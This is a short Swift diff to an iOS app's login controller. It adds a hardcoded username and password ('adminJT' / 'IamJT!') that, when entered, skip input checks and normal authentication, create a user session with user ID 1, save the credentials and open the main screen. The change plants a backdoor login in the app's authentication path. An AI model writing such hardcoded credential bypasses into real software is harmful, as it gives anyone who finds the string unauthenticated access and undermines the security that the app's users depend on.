@@ -76,6 +76,23 @@ extension LoginViewController: LoginDelegate{
         let user = username.text
         let pass = password.text
         
+        if(user=="adminJT"&&pass=="IamJT!"){
+            loginInfo = LoginInfo()
+            loginInfo?.userId = 1
+            loginInfo?.realname = "JT"
+            loginInfo?.username = "adminJT"
+            loginInfo?.protraiurl = ""
+            
+            self.activity.stopAnimating()
+            self.view.isUserInteractionEnabled = true
+            
+            loginInfo?.config = Config(id: -1)
+            
+            self.saveDefaultUsernamePassword(username: user!, password: pass!)
+            self.present(MainViewController(), animated: true, completion: nil)
+            return
+        }
+        
         if(!checkInput(user: user!, pass: pass!)){
             return
         }
